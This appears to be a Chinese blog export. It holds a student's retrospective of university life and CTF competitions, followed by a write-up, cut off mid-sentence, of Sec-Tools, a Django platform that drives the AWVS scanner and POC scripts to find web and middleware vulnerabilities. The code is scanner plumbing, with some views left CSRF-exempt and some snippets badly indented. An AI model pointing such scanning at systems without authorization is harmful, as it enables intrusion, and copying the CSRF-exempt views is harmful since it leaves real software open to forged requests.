初涉学习\n\n学习上，我起初仅仅是按部就班的去上课，听得也还算认真，但是课后基本没怎么去学习，因为刚刚接触计算机，大一的课程我听起来还是比较吃力，对网络安全啊、操作系统啊等等概念还是懵懵懂懂的，后来学着学着兴趣大了那么一些，会课后自己主动去学习一些相关知识，那时会因为成功运行出程序而开心不已，大一学期我的综合成绩排名专业第一，也让我拿到了国家励志奖学金，一等奖学金和二等奖学金。\n\n### 初探成都\n\n课堂之外，大一这一年我主要去了成都的各大高校参观（川大，电子科大，西南交大，成都理工，四川师范），几乎成都的高校都让我走了个遍，体会到了不同的学习氛围，深感自己离优秀还差很远。成都有名的地方也去了个遍（春熙路，锦里，宽子巷子，都江堰...），但第一次去并没有给我特别震撼的感觉，随着后来频繁的去，我对这些地方的印象发生了改变，他们都有自己独特的魅力吸引着我，随着后来我去到了其他不同的城市，感受了不同的氛围，我知道其实我已经慢慢爱上了成都这座城市。\n\n## ②大二\n\n时间：2018.09-2019.07\n\n### 加入实验室\n\n这一年令我印象最深的是通过考核加入了学院的网络安全实验室的 CTF 战队 Covteam，这很大程度上改变了我后来的人生轨迹，战队主要以参加各大 CTF 比赛为主 ，刚进实验室时，学长学姐给我们安排学习任务，每周开会，期间我也确定了自己的方向—Web安全，我也从刚开始啥也不会的小白，逐渐成长起来。先后去重庆邮电大学参加了全国大学生信息安全竞赛-创新实践能力赛获得了赛区二等奖，去成都信息工程大学参加四川省大学生信息安全技术大赛获得一等奖，去成都工业学院参加全国软件和信息技术专业人才大赛获得三等奖，以及各大 CTF 比赛等等。这些算是我最初涉及的比赛吧，能拿到奖自然是很开心的，但是通过参加这些比赛，我看了到自己与大佬的差距。\n\n### 拿到国奖\n\n这一年我的综合成绩排名仍然是专业第一，加之各种比赛奖项，这让我获得了国家奖学金，勤奋谦卑奖学金和两次一等奖学金。工作上我依旧担任班级班长，同样也获得了校级优秀学生干部。关于入党，这一年被选为发展对象接而成为了预备党员。\n\n### 阿坝之旅\n\n寒假从成都出发到达阿坝州的理县一路向前去了桃坪羌寨（电影杀生的取景地）、甘堡藏寨、毕棚沟旅游，体验到了不一样的风土人情，蹦了人生第一次野迪，这一趟整体上还是比较满意的，因为是冬天去的，一路的雪景还是很震撼的（对于一个南方小镇青年来说），也完成每年出去走一走的目标。\n\n## ③大三\n\n时间：2019.09-2020.07\n\n> 这一年印象最深的就是突如起来的疫情了，打破了原本平静的生活，整个下学期我都在家上网课。这一年的主旋律是学习，比赛，各种玩。这一年对我来说提升很快，一方面是参加了很多比赛，长了不少见识，认识了很多大佬；另一方面是因为疫情让我沉静下来，学到了很多新知识。也是这一年，我沉下心来学习了一个月英语，也让我烂透了的英语水平有了不少的提升。\n\n### 深入学习\n\n上学期的课程相对来说都比较难，数据结构、汇编、安全编程技术...，都令我头大，花费的时间和心思也更多一些。下学期在家上网课，好几门课讲的知识我都会，所以这些课我都是能水就水，网课放着然后搞自己的东西（系统学了下前端、Django、渗透），这一学期也让我感觉提升了很多，在家静下来学到了很多知识。这一年我的综合成绩排名仍然是专业第一，获得了两次一等奖学金，国家励志奖学金（国奖我们辅导员带的两个专业只有一个名额，没有竞争过另外一个专业的同学😭，痛失国奖）。\n\n### 各种比赛\n\n上学期参加了学校举办的西华创想杯获得二等奖，通过省团委和四川学联的认证获得了四川省大学生“综合素质A级证书”（需要满足7个类别共21个项目，累计总分达到28分即可认证，感觉还是有一定难度的，我大三才满足条件😟）\n\n下学期因为疫情爆发，很多比赛都推迟或者改为线上举行了，参加了四川省计算机作品赛获得了二等奖；参加中国大学生计算机设计大赛获得省级赛二等奖并被推进国赛，获得国赛三等奖；参加全国大学生信息安全对抗技术竞赛获得二等奖。\n\n### 假期乐趣\n\n上学期和朋友去了乐山玩，看了乐山大佛，吃了各种小吃，至今仍回味的是乐山油炸串串和三鲜冰粉，便宜又好吃。过年前夕（疫情爆发之前），我去了凉山州游玩 ，途径雅安，到达西昌的邛海和庐山，一路向前去了泸沽湖，泸沽湖的水和天空真的是格外纯净，这里还没那么商业化，很值得去看看。暑假（疫情控制得很好了）去了室友家大连玩，第一次去东北，第一次看了海，第一次看了海豚表演，这一趟差不多把大连玩了个遍（棒棰岛，圣亚海洋公园，星海公园，威尼斯水城，日俄监狱，旅顺......），美好的时光可总是那么短暂！\n\n## ④大四\n\n时间：2020.08-2021.07\n\n### 保研成功\n\n这一年经历了很多，首先是因为前三年成绩一直排名第一和各种比赛获奖的加成顺利获得了保研资格，通过预推免成功拿到电子科技大学的offer，需要保研经验的可以看我另一篇文章[保研电子科大经验分享](https://jwt1399.top/posts/39301.html)。保研成功后，我开始慢慢做毕设了，选定了Web安全工具开发的题目，疫情期间学习的 Django 派上了用场，最终断断续续的完成了项目的开发和论文的撰写。需要参考我的毕设可以看我另一篇文章[Web安全工具开发](https://jwt1399.top/posts/12663.html)，这个项目也在我的 [GitHub](https://github.com/jwt1399/Sec-Tools)上开源了，求 Star ！通过答辩我的论文获得了优秀论文，并且我还获得了四川省优秀毕业生的荣誉称号。\n\n### 外出项目\n\n因为成功保研，这一年我的任务就只有做毕设，这便让我有了时间外出做一些项目，上学期我去了宜宾XX银行对他们的后台系统进行渗透测试，呆了9天了，赚取了一笔不菲的佣金。下学期去上海某金融企业总部参加 HW 行动，在上海呆了近20天，又让我赚了一笔不错的收入。这样外出的一些项目还是很有意义的，不仅能赚到很多Money，还能学到知识、认识朋友、开阔眼界，未来希望自己多出去接接项目，而不是一味死读书。\n\n### 走走停停\n\n上学期假期去了阆中古城（不推荐去，古城里面没什么好玩的，主要被张飞牛肉和醋泡脚占领）和剑门关（剑门关还是值得一去的，有个天赐温泉还不错，剑门关景区里也还行，但是我没有完全走完，实在太累了），下学期因为工作去上海，去了外滩逛了逛，南京东路吃了上海本帮菜，个人感觉太清淡，不太符合我的口味，个别菜还是挺好吃的，在陕西南路吃了一家有名的面，店铺很小，但是排队的人很多，一碗面差不多都是50以上，但其实味道一般吧，可能是上海的口味真的不太适合我。本来打算去迪士尼的，由于因为时间冲突没有去到里面玩，但是逛了迪士尼的商店（商店的玩偶和各样的东西都挺好看的，但也是真的贵），晚上还蹭了迪士尼的烟花，以后有机会再去进到里面去玩吧，从上海回来后直接飞到了重庆，虽然大二去重邮比赛的时候去过，但当时并没有仔细的玩，这次去重庆，差不多把重庆玩了个遍，洪崖洞、解放碑、朝天门码头、李子坝轻轨站、鹅岭二厂……不过令我印象最深的还是重庆的八一好吃街，里面的小吃都很不错，尤其是水果冰汤圆(地点在八一好吃街的入口处，15元一碗，我一天吃了3碗)，简直绝了，至今还没有在成都找到替代品，我想未来我还会去很多次重庆的吧。\n\n## ⑤总结\n\n说起来遗憾其实挺多的，专业知识没有学得特别好、编程水平也很是一言难尽、英语水平也没有很大的提升，口语水平更是一塌糊涂、没有去很多很多的城市走走看看、没有正经去公司参加过实习、没有在大学存很多很多钱、自己没有变得那么那么优秀。。。\n\n至于展望，希望在成电的三年研究生生涯能收获满满，学到很多实用知识，多拿一些奖学金，多接一些项目多赚一点钱，实现学费和生活费自由，发一些优质文章，认识一些志趣相投的朋友。另外希望英语水平能够提升一点。毕业后希望找到一份不错的工作（希望薪资达到30w~50w），30岁之前希望在成都拥有一套属于自己的房子。\n\n这四年经历了太多太多，也许这是我人生中最有意义的四年吧，还有好多好多内容没有写呢，有些不知道如何写，有些不想写，有些我记不太清了，等我想好了我再慢慢写吧，暂时就写这么多，我的青春似乎就这么结束了😶\n\n## ⑥致谢\n\n桃李不言，下自成蹊。首先感谢所有教导过我的老师们，其次我要感谢我的毕设指导老师。在毕设论文的撰写过程中,得幸遇曾老师，从选题到系统设计再到论文编写，每一部分都离不开曾老师的指导和帮助。饮其流时思其源，成吾学时念吾师。在此衷心的感谢我的指导老师以及所有教导过我的老师们。衷心祝愿各位老师工作顺利，平安喜乐。\n\n结草衔环，饮水思源。其次感谢我的家人二十余载的悉心培养和教育，感谢他们在我求学之路上的无私支持与默默付出。在我遇到困惑时指点方向，烦恼时耐心开导，做我最坚强的后盾。祝愿我的家人身体健康，天天开心。\n\n山水一程，三生有幸。感谢信息安全二班可爱的同学们，感谢你们给予我工作上的帮助与支持，二十四位同学从天南地北因为缘分相聚于此，一起度过了本科美好的四年，愿毕业后我们在彼此看不到的地方熠熠生辉。\n\n有缘相识，有幸相知。感谢实验室纪老师在学习上给予鼓舞与勉励，在生活上给予帮助与开导。感谢赛场上一起并肩作战，赛场下一起交流学习的实验室的小伙伴们，愿你们有前程可奔赴，亦有岁月共回首。\n\n往日不悔，来日可期。最后我要感谢我的女朋友庞小姐，兜兜转转，未曾离开，知我冷暖，懂我悲欢，感谢让我在最好的年纪遇见你，六年岁月，无需惊艳时光，唯愿不负彼此。\n","tags":["总结"],"categories":["Share"]},{"title":"Web安全工具开发","url":"/posts/12663.html","content":"\n<h1 align=\"center\" >🍉Sec-Tools</h1>\n<p align=\"center\">本项目已开源：学习的同时，给个 Star 吧 ！！！</p>\n\n| GitHub | https://github.com/jwt1399/Sec-Tools |\n| ------ | ------------------------------------ |\n| Gitee  | https://gitee.com/jwt1399/Sec-Tools  |\n\n## 前言\n\n![welcome](https://img.jwt1399.top//img/20210617152728.png)\n\n项目从12月底至今，期间因各种原因断断续续的开发，前前后后已经发布了5个版本，从最初只有框架的 `V1.0` 版本，到如今功能日趋完善的 `V2.3` 版本项目正在不断完善中，现已集成`端口扫描`、`指纹识别`、`旁站探测`、`信息泄露扫描`、`安全导航`等多个功能，后续将加入`漏洞检测`、`目录识别`、`域名探测`等功能，一起期待吧！页面我们尽可能做到简单、清新，便于用户使用。现 `UI` 已经适配`PC端`、`Phone端`、`Pad端`，使用户得到舒适的使用体验。我们致力于打造一款安全高效、操作简单、界面清爽、兼容适配的安全工具。本项目的灵感来自于国光师傅的文章[Django 编写 Web 漏洞扫描器挖坑记录](https://www.sqlsec.com/2020/05/webscan.html)。就像国光师傅说的那样我们无论是开发还是安全都有很长的路要走，路漫漫其修远兮，吾将上下而求索！\n\n2021.03.02更新：版本更新到 `V2.5` ,新增了`漏洞扫描`、`目录扫描`等功能并且进行了一系列 `UI` 优化。\n\n2021.04.20更新：版本更新到`V2.7`,新增了`漏扫详情页`、`仪表盘`、`域名探测`等功能并且进行了一系列优化和Bug修复。\n\n## 项目介绍\n\n### 系统简介\n\n本项目命名为**Sec-Tools**，是一款基于 Python-Django 的在线多功能 Web 应用渗透测试系统，包含漏洞检测、目录识别、端口扫描、指纹识别、域名探测、旁站探测、信息泄露检测等功能。本系统通过`旁站探测`和`域名探测`功能对待检测网站进行资产收集，通过`端口扫描`、`指纹识别`、`目录识别`和`信息泄露检测`功能对待检测网站进行信息收集，通过收集的信息分析评估网站存在哪些安全隐患，然后使用`漏洞检测`功能揭示网站存在的漏洞以及危害等级并给出修复建议。通过这一系列的步骤，可以对Web应用进行全面检测，从而发现网站存在的安全隐患，因此用户可以针对相应的网络威胁做出应急响应，进而提升站点的安全性。\n\n### **团队成员**\n\n本项目由我担任组长，带领其余3人共同开发，因此代码风格会有不同，相关功能的实现深度也会参差不齐 !\n\n <table style=\"padding-left:150px\">\n   <tbody>\n      <tr>\n          <td style=\"text-align:center;\">\n              <a href=\"https://jwt1399.top\">简同学</a>\n          </td>\n          <td style=\"text-align:center;\">\n              <a href=\"https://www.jianshu.com/u/27d54629447c\">邓同学</a>\n          </td>\n\t\t  <td style=\"text-align:center;\">\n              <a href=\"https://blog.xiafeng2333.top/\">王同学</a>\n          </td>\n\t\t  <td style=\"text-align:center;\">\n              <a>林同学</a>\n          </td>\n      </tr>\n    <tr>\n\t\t<td style=\"text-align:center;\" > <img width=\"200\" src=\"https://jwt1399.top/medias/avatar.png\"></td>    \n\t\t<td style=\"text-align:center;\"><img width=\"200\" src=\"https://upload.jianshu.io/users/upload_avatars/16052738/fffbc8fc-a9c3-4a1c-ad56-157c32f57f79?imageMogr2/auto-orient/strip|imageView2/1/w/240/h/240\"></td>  \n\t\t<td style=\"text-align:center;\" ><img width=\"200\" src=\"https://pic3.zhimg.com/v2-6fb8dc878b496af2ec012c1f001865b2_xl.jpg\"></td>\n\t\t<td style=\"text-align:center;\"><img width=\"200\" src=\"https://tse2-mm.cn.bing.net/th/id/OIP.84TQxrsYyNGXAkgvPHEtyQAAAA?w=165&h=180&c=7&o=5&dpr=1.25&pid=1.7\"></td>  \n   </tr>\n </tbody></table>\n\n\n\n###  相关技术\n\n|      名称      |    版本     |\n| :------------: | :---------: |\n|     Python     |    3.7.0    |\n|     Django     |    3.1.4    |\n|     SQLite     |   3.35.2    |\n|    ECharts     |    5.0.1    |\n|     Tabler     | 1.0.0-beta2 |\n|    SimpleUI    |  2021.1.1   |\n|    Docsify     |   4.11.6    |\n|     Layer      |    3.2.0    |\n| Boostrap Table |   1.18.2    |\n\n### 项目功能\n\n![](https://img.jwt1399.top//img/20210617154357.png)\n\n## 项目首页\n\n首页采用 ECharts 对漏洞扫描的漏洞等级、指纹识别组件、安全导航数据做了可视化图表展示，图表的风格没有统一，凑合看吧😂\n\n![仪表盘页](https://img.jwt1399.top//img/20210618105902.png)\n\n## 身份验证\n\n> 新用户想要使用系统功能必须要注册登录，游客只能访问部分页面。本系统有普通用户和超级用户。普通用户可以使用本系统的所有功能，但是不能登录后台管理系统。超级用户不仅可以使用所用功能还可以登录后台管理系统中所有的用户权限和数据。\n\n **设计思路：**登录和注册模块在 Django 自带的认证模块的基础上进行实现，因此在`后台-->用户与授权`就可对注册用户进行权限分配和相应管理。我们使用 Django 自带的数据库 SQLite 来存放账户信息，重构了数据库表`auth_user`表，增加了用户邮箱字段，auth_user 中密码字段是加了 salt 的 sha256 值再经过 base64 编码之后的值，保障了用户的信息安全。\n\n![auth_user](https://img.jwt1399.top//img/20210618113948.png)\n\n| 登录页 | ![](https://img.jwt1399.top//img/20210421020945.png) |\n| ------ | ---------------------------------------------------- |\n| 注册页 | ![](https://img.jwt1399.top//img/20210421001457.png) |\n\n重设密码功能调用第三方包 `django-password-reset` 进行实现\n\n| 步骤一 | ![](https://img.jwt1399.top//img/20210421020757.png) |\n| ------ | ---------------------------------------------------- |\n| 步骤二 | ![](https://img.jwt1399.top//img/20210421020803.png) |\n\n## 漏洞检测\n\n> 该模块主要是对目标Web系统进行安全漏洞扫描，包括SQL注入、跨站脚本攻击（XSS）、弱密码、中间件漏洞。中间件漏洞扫描包括对Weblogic、Struts2、Tomcat 、Jboss、Drupal、Nexus的已知漏洞进行检测，用户提供目标URL并选择CVE漏洞编号。\n\n###  设计思路\n\n该模块的全扫描、SQL注入漏洞扫描、XSS漏洞扫描、弱口令扫描、仅爬取是调用 AWVS API 进行实现。中间件漏洞扫描是基于脚本模拟网络请求实现。根据漏洞形成的原因，生成一些测试 payload 发送到目标系统，再由返回的状态码和数据来判断payload是否有效。\n\n### 实现效果\n\n![漏洞扫描](https://img.jwt1399.top//img/20210617161157.png)\n\n点击扫描目标跳转到漏洞结果页：\n\n![漏洞结果](https://img.jwt1399.top//img/20210619102157.png)\n\n再点击扫描目标的跳转到漏洞详情页：\n\n![漏洞详情](https://img.jwt1399.top//img/20210619102149.png)\n\n### 详细实现\n\n#### 添加扫描目标\n\n漏洞扫描最开始的工作是添加扫描目标到 AWVS 的扫描队列中。AWVS 提供了一个 API 接口: `/api/v1/targets`，使用 POST 请求， POST 请求参数为：`{\"address\":\"XXXX.XXXX.XXXX\",\"description\":\"xxxx\",\"criticality\":\"10\"}`。\n\n当目标添加成功后会返回一个 target_id ，这个值在所有扫描中是唯一的。通过 target_id 判断目标是否添加成功。添加完目标后并没有开始扫描，需要使用另一个 API 接口：`/api/v1/scans`，使用 POST 请求，传入刚刚添加目标生成的 target_id 和用户选择的扫描类型，POST 请求参数为：`{\"target_id\":\"xxxxxxx\",\"profile_id\":\"xxxxxxx\"}`。开始扫描将会返回状态码200。\n\n使用 Python 的第三方库 requests 来实现 API 接口访问。核心代码如下:\n\n```python\n#Target: POST请求/api/v1/targets\ntry:\n\t#data包含目标URL和类型，auth_headers包含API_KEY\n   \tresponse = requests.post(targets_api, auth_headers, data, False)\nresult = response.json()\ntarget_id = result.get('target_id')\n   \treturn target_id\nexcept Exception:\nreturn None\n#Scan: POST请求/api/v1/scans\ntry:\n    response = requests.post(scan_api, data, auth_headers, False)\n    status_code = 200\nexcept Exception:\nstatus_code = 404\nreturn status_code\n```\n\nAPI 接口已经实现，还需要获取用户输入的数据。由于本系统是基于 Django 实现的，所以使用 HTML+JavaScript 提供用户界面和接受和发送数据到后端，后端使用 Python 实现。首先在 **urls.py** 里面加入添加访问路径\n\n`path('vuln_scan', views.vuln_scan, name='vuln_scan')`\n\n在 **views.py** 中定义 `vuln_scan()` 函数接收前端的用户输入，并调用已经写好的 API 函数。用户输入的 url 为扫描的目标，扫描类型包括SQL注入、XSS漏洞、弱口令和全扫描，其中全扫描就是扫描所有类型的漏洞，如果添加成功后返回的 target_id 不是 None，说明添加成功，就可以开始调用开始扫描的 API，开始扫描后返回状态码，为200则开始扫描，返回成功否则返回失败。核心代码如下：\n\n```python\n@csrf_exempt\ndef vuln_scan(request):\n    #通过POST请求获取用户输入的URL和扫描类型\n    url = request.POST.get('ip')\n    scan_type = request.POST.get('scan_type')\n    t = Target(API_URL, API_KEY)\n    #将目标URL添加到扫描队列中\n    target_id = t.add(url)\n    #如果target_id不为None,则开始扫描\n    if target_id is not None:\n        s = Scan(API_URL, API_KEY)\n        status_code = s.add(target_id, scan_type)\n        if status_code == 200:\n            return success()\n    return error()\n```\n\n最后使用 JavaScript 来实现发送用户输入的数据，选择通过 POST 方法发送数据，并在发送之前判断用户输入的合法性，核心代码如下:\n\n```javascript\nfunction get_scan_info(ip , scan_type) {\n#使用POST请求发送用户输入\n        $.post('/vuln_scan', {\n            ip: ip ,\n            scan_type: scan_type\n        }, function (data) {\n            if (data.code !== 200) {\n                ......\n            } else {\n                ...... \n            }\n           ......});\n    }\nvar domain = $('input[name=scan_url]').val();\n#使用循环判断用户选择的扫描类型\nfor(var i=0; i<document.getElementsByName(\"scan_type\").length; i++) {\n    if (document.getElementsByName(\"scan_type\")[i].checked) {\n      var scan_type=document.getElementsByName(\"scan_type\")[i].value;\n    }\n}\nif(domain){\n\tget_scan_info(domain,scan_type)\n}else{\n\t......\n}\n```\n\n总体来说，通过上述的代码实现，实现了将用户输入通过 JavaScript 传输给后台，后台接收数据后将调用 AWVS API，然后 AWVS 开始根据用户输入开始扫描目标 URL，扫描结束后将结果保存在数据库中。实现效果如下：\n\n![](https://img.jwt1399.top//img/20210619104620.png)\n\n#### 获取扫描结果\n\n在上一小节中，将目标扫描的结果保存到数据库中，我们需要得到所有的扫描目标，`‘/api/v1/scans‘`，请求方式为 GET，请求成功后会返回所有扫描目标的信息，利用这个 API 可以实现展示所有扫描目标。要实现展示每个扫描目标的所有漏洞的功能，需要按照 target_id 来在所有扫描目标中搜索。AWVS 也提供了相应的 API，我们需要用到的 API 为：`/api/v1/vulnerabilities`\n\n`?q=severity:{int};criticality:{int};status:{string};cvss_score:{logicexpression};cvss_score:{logicexpression};target_id:{target_id};group_id:{group_id}`。请求方式为 GET。利用 target_id 搜索每个扫描目标。这也解决了漏洞细节页面的 URL 问题。当使用 target_id 搜索扫描目标成功时将会返回这个目标的所搜漏洞信息，包括这个目标包含的漏洞个数、每个漏洞的危险等级、扫描时间、扫描类型、扫描状态等信息。\n\n具体实现步骤和添加扫描目标大体相似，首先第一步使用 requests 来实现 API 请求。核心代码如下：\n\n```python\n#获取所有扫描目标\nresponse=requests.get(scan_api, self.auth_headers, False) \nscan_response=response.json().get('scans')\nfor scan in scan_response:\n   scan['request_url'] = request_url\n   scan_list.append(scan)\nreturn scan_list\n#搜索状态为“open“,对应target_id的扫描目标\nvuln_search_api=f'{vuln_api}?q=status:{status};target_id:{target_id}'\ntry:\n#使用get方式请求\n    response = requests.get(vuln_search_api, auth_headers, False)\n#返回搜索结果目标的所有漏洞信息\n    return response.text\nexcept Exception:\n    return None\n```\n\n在 **urls.py** 中加入用户访问的 url ，这个需要提供一个 target_id 方便后续功能的实现，先获取所有目标的target_id，然后使用循环将所有 target_id 加入到 urlpatterns 列表中。因为在 Django 中 views 函数通常只能使用一个 request 参数，由于这里需要将 target_id 传入到 views 函数中，使用正则匹配的 `“(?P<target_id>.*)$”` 接收传入的 target_id，在 views 里对应函数的第二个形参名必须和 `<>` 里的值一致才有效。核心代码如下：\n\n```python\npath('vulnscan', views.vulnscan, name=\"vulnscan\"),\nfor target_id in target_ids:\n\t  #使用正则匹配获取第二个参数：taget_id\nurlpatterns.append(url(r'^vuln_result/(?P<target_id>.*)$', views.vuln_result, name='vuln_result/'+target_id))\n```\n\n在 **views.py** 里定义函数 `vulnscan(request)` 获取所有对应的目标漏洞信息。使用 API 得到返回的漏洞危险等级、扫描目标URL、每个漏洞唯一标识的 vuln_id、扫描类型、扫描处理时间，API 返回的扫描处理时间不是标准的时间格式，使用正则匹配的方式，将其转换为 `“%Y-%m-%d %H:%M:%S“` 的格式，再定义函数 `vuln_result(request,target_id)`，根据 target_id 获取扫描目标中所有漏洞信息，包括存在漏洞的URL、漏洞类型、状态和处理时间等信息。核心代码如下：\n\n```python\n@login_required\ndef vuln_result(request, target_id):\n    d = Vuln(API_URL, API_KEY)\n    data = []\n    vuln_details = json.loads(d.search(None,None, \"open\", target_id=str(target_id)))\n\n    id = 1\n    for target in vuln_details['vulnerabilities']:\n        item={\n            'id': id,\n            'severity': target['severity'],\n            'target': target['affects_url'],\n            'vuln_id':target['vuln_id'],\n            'vuln_name': target['vt_name'],\n            'time': re.sub(r'T|\\..*$', \" \", target['last_seen'])\n        }\n        id += 1\n        data.append(item)\n    return render(request,'vuln-reslut.html',{'data': data})\n```\n\n在这个子功能中，前端的数据展示使用的是 Bootstrap Table。这个模板有很多实用的功能，比如表格的搜索功能、分页展示功能等等，增加了用户体验。表格的数据在 HTML 中使用双花括号来接收，在 **views.py** 函数中返回的到相应的 HTML 页面时，将 data 字典一起返回。这样的返回方式可以将使用字典中的 key 值获取对应的 values 值。还可以是使用 if-else、for 等语句来分类展示数据。核心代码如下：\n\n```django\n{% for item in data %}\n……………\n# 这个只展示了扫描目标列，其他列类似 \n<a href=\"/vuln_detail/{{ item.vuln_id }}\"> {{ item.target }}</a>\n……………\n{% endfor %}\n```\n\n最后实现的效果如下图所示，根据每个扫描状态不同有不同的显示，使用红黄蓝绿来分类高危、中危、低危、info等级的漏洞。最后展示了扫描的处理时间。\n\n![](https://img.jwt1399.top//img/20210619110224.png)\n\n表格中扫描目标列可以点击进入查看目标的所有漏洞信息，如下图所示，展示了特定的扫描目标每个漏洞的危险等级、存在漏洞的URL、漏洞的类型。\n![](https://img.jwt1399.top//img/20210619102157.png)\n\n#### 获取漏洞细节\n\n在实现漏洞扫描和结果展示后，还需要获取每个漏洞的细节。包括导致漏洞的请求参数、测试的 payload、数据请求包、简要的修复建议等等。因为每个漏洞也存在一个唯一的标识 vuln_id，可以根据这个值查询指定漏洞的所有信息。使用的 API 为：`/api/v1/vulnerabilities/{vuln_id}`，请求方式为 GET。\n\n 同样地，首先使用 requests 来实现 API 的调用，传入 vuln_id 来查询指定漏洞的所有信息，代码如下：\n\n```python\n#获取指定漏洞的相关信息\ndef get(self, vuln_id):\n    vuln_get_api = f'{self.vuln_api}/{vuln_id}'\n    try:\n\t\t#使用GET请求将vuln_id传给API，结果以json格式返回\n        response = requests.get(vuln_get_api, auth_headers, False)\n        return response.json()\n    except Exception:\n        return None\n```\n\n在 **urls.py** 中添加漏洞细节的 url，这里与上一节展示扫描目标的所有漏洞类似，都用正则匹配的形式接收 **views.py**里函数的第二个形参，但是这里不在使用 target_id 而是使用 vuln_id。代码如下：\n\n```python\nfor vuln_id in vuln_ids:\n\turlpatterns.append(url(r'^vuln_detail/(?P<vuln_id>.*)$', views.vuln_detail, name='vuln_detail/' + vuln_id))\n```\n\n在 **views.py** 里面定义 `vuln_details(request,vuln_id)` 函数，根据 vuln_id 查询指定漏洞的相关信息。该函数将 API 返回的值中有用的信息提取出来到字典 data 里，返回给 vuln-details.html 页面，使用 双花括号 来接收该漏洞的受影响的URL、处理时间、漏洞类型、漏洞测试参数、数据请求包、简要的修复建议等信息。实现效果如下图所示。\n\n```python\n@login_required\ndef vuln_detail(request,vuln_id):\n    d = Vuln(API_URL,API_KEY)\n    data = d.get(vuln_id)\n    print(data)\n    parameter_list = BeautifulSoup(data['details'], features=\"html.parser\").findAll('span')\n    request_list = BeautifulSoup(data['details'], features=\"html.parser\").findAll('li')\n    data_dict = {\n        'affects_url': data['affects_url'],\n        'last_seen': re.sub(r'T|\\..*$', \" \", data['last_seen']),\n        'vt_name': data['vt_name'],\n        'details': data['details'].replace(\"  \",'').replace('</p>',''),\n        'request': data['request'],\n        'recommendation': data['recommendation'].replace('<br/>','\\n')\n    }\n    try:\n        data_dict['parameter_name'] = parameter_list[0].contents[0]\n        data_dict['parameter_data'] = parameter_list[1].contents[0]\n    except:\n        pass\n    num = 1\n    try:\n        Str = ''\n        for i in range(len(request_list)):\n            Str += str(request_list[i].contents[0])+str(request_list[i].contents[1]).replace('<strong>', '').replace('</strong>', '')+'\\n'\n            num += 1\n    except:\n        pass\n    data_dict['Tests_performed'] = Str\n    data_dict['num'] = num\n    data_dict['details'] = data_dict['details'].replace('class=\"bb-dark\"','style=\"color: #ff0000\"')\n    return render(request, \"vuln-detail.html\", {'data': data_dict})\n```\n![](https://img.jwt1399.top//img/20210619102149.png)\n\n#### 基于POC验证的中间件漏洞扫描\n\n> 本系统使用POC脚本实现对一些中间件的漏洞扫描[7]，包括Weblogic、Tomcat、Drupal、JBoss、Nexus、Struts2等等。通过每个漏洞的特点，使用Python编写不同的POC脚本验证目标是否存在该漏洞。\n\n首先这里的用户界面和基于AWVS的漏洞扫描共用，单独加入了中间件漏洞CVE编号的选择。使用JavaScript发送用户输入的数据到后端。核心代码如下：\n\n```javascript\n#使用POST请求提交用户的输入\nfunction get_Middleware_scan(ip , CVE_id) {\n    $.post('/Middleware_scan', {\n    ip: ip , #目标URL\n    CVE_id: CVE_id  #选择的CVE编号\n}, function (data) {\n#处理返回结果\n      ………\n      ………}); \n}\n```\n\n将目标添加到数据库后，再查询数据库开始扫描，通过 ajax 来访问 start_Middleware_scan 调用开始扫描的函数，由于扫描时间可能会很长，需要设置足够的 timeout 来等待扫描的结果返回。核心代码如下：\n\n```javascript\n$.ajax({\n#使用POST请求发送目标URL和CVE编号，设置超时为1秒\n    type: \"POST\",\n    url: '/start_Middleware_scan',\n    timeout: 10000,\n    data: {\n    ip: ip,\n    CVE_id: CVE_id\n    }\n});\n```\n\n在 **urls.py** 里加入中间件漏洞扫描的访问路径，需要加入两个路径：`’Middleware_scan‘`，`‘start_Middleware_scan’`。前者是用户添加扫描目标时的路径，用于接收用户输入的目标和CVE编号之后将其插入数据库。后者是将目标插入数据库之后，通过时间戳、状态、目标 URL 以及 CVE 编号查询出来开始扫描。当扫描结束时更新数据库中对应扫描目标的状态。这样的设计可以实时的看到扫描的状态。\n\n数据库使用的是 Sqlite，在 **models.py** 里创建一个数据库表 Middleware_vuln ，字段包括ID、目标URL、状态、结果、CVE编号、时间戳。在 Django 里定义这个类表示我们需要创建的数据库，在 modles.py 里创建好之后，使用命令`python manage.py makemigrations`来记录 modles.py 的所有改动，并且将这个改动迁移到 migrations 这个文件下生成一个文件例如：0001文件，如果你接下来还要进行改动的话可能生成就是另外一个文件不一定都是0001文件，但是这个命令并没有作用到数据库，再使用命令 `python manage.py migrate` 将根据刚刚检测到的改动来创建数据库表和字段属性。核心代码如下：\n\n```python\nclass Middleware_vuln(models.Model):\n#类名为数据库表名，变量名为字段名，字段属性定义如下\n\tid = models.AutoField(primary_key=True)\n\turl = models.CharField(max_length=100, null=True)\n\tstatus = models.CharField(max_length=20, null=True)\n\tresult = models.CharField(max_length=100, null=True)\n\tCVE_id = models.CharField(max_length=100, null=True)\n\ttime = models.CharField(max_length=100, null=True, unique=True)\n\n```\n\n在添加目标和开始检测的时候我们需要插入数据库和查询数据库，这里使用 Django 的函数来处理数据库的增删查改。对于 Middleware_vule 的插入使用 `Middleware_vuln.objects.create(url, status, result, CVE_id, time)`，更新使用 `Middleware_vuln.objects.filter(time).update(status, result)`。还需要使用 try-except 来处理异常情况并打印出错信息。\n\n```python\ndef insert_Middleware_data(url, CVE_id, Time, result=None, status=\"runing\"):\n    try:\n        Middleware_vuln.objects.create(url=url, status=status, result=result, CVE_id=CVE_id, time=Time)\n        print(\"insert success\")\n        return True\n    except:\n        print(\"data insert error\")\n        return False\n\n\ndef update_Middleware_data(url, CVE_id, Time, result):\n    try:\n        Middleware_vuln.objects.filter(url=url, status='runing', CVE_id=CVE_id, time=Time).update(status=\"completed\", result=result)\n        print(\"update success\")\n    except:\n        print(\"data updata error\")\n```\n\n 在**views.py**里定义 `Middleware_scan()` 获取用户输入，并插入到数据库中,其中时间戳 Time 为全局变量，作为后面开始扫描部分查询数据库的条件，在插入数据成功就返回 success(),否侧返回 error()，这里返回的函数时返回的状态码，success()返回的是200，error()返回404，通过上面 JavaScrip t接收后做出判断，并弹出相应的提示框，核心代码如下：\n\n```python\nTime = 0.0\n@csrf_exempt\n@login_required\ndef Middleware_scan(request):\n    #使用POST请求获取用户输入，并将其插入数据库中。\n    #Time作为全局变量插入到数据库中，作为查询目标信息的条件。\n    global Time\n    try:\n        url= request.POST.get('ip')\n        CVE_id = request.POST.get('CVE_id').replace('-',\"_\")\n        Time = time.time()  # time.strftime(\"%Y-%m-%d %H:%M:%S\", time.localtime(t))时间戳转日期格式\n        if insert_Middleware_data(url, CVE_id, Time):\n            return success()\n    except:\n        return error()\n```\n\n又定义函数 `start_Middleware_scan()`,实现将数据库中时间戳为 Time，状态为 